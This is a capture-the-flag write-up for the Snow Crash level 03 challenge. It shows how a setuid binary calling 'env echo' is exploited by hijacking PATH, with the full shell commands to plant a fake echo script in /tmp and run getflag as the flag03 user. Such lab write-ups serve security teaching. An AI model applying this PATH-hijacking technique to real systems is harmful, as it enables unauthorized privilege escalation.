# Snow Crash - Level 03

## Finding the Executable

We find an executable named `level03`. To inspect its contents, we use the following command:

```bash
cat level03
```

The output reveals compiled C code. Using a decompiler, we retrieve the original source code, which includes the following line:

```c
return system("/usr/bin/env echo Exploit me");
```

## Understanding the Exploit

The `env` command uses the `$PATH` variable to locate `echo`. It executes the first matching instance found in the directories listed in `$PATH`. By manipulating `$PATH`, we can execute our own `echo` command instead of the system’s default.

Additionally, the program runs with the permissions of its owner, `flag03`, as confirmed by the following code:

```c
v1 = getegid();
v2 = geteuid();
v0 = v1;
setresgid(v1, v1);
v0 = v2;
setresuid(v2, v2);
```

## Exploiting the Vulnerability

To escalate privileges, we create a custom `echo` script that runs `getflag` and place it in a directory we control. We then modify `$PATH` to prioritize this directory.

### Steps:

1. Create a new directory and navigate into it:

   ```bash
   mkdir /tmp/exploit
   cd /tmp/exploit
   ```

2. Create a fake `echo` script:

   ```bash
   echo "#!/bin/bash" > echo
   echo "getflag" >> echo
   chmod +x echo
   ```

3. Modify the `$PATH` variable:

   ```bash
   export PATH=/tmp/exploit:$PATH
   ```

4. Run the vulnerable executable:

   ```bash
   ./level03
   ```

This executes `getflag` with `flag03`'s permissions, retrieving the flag.

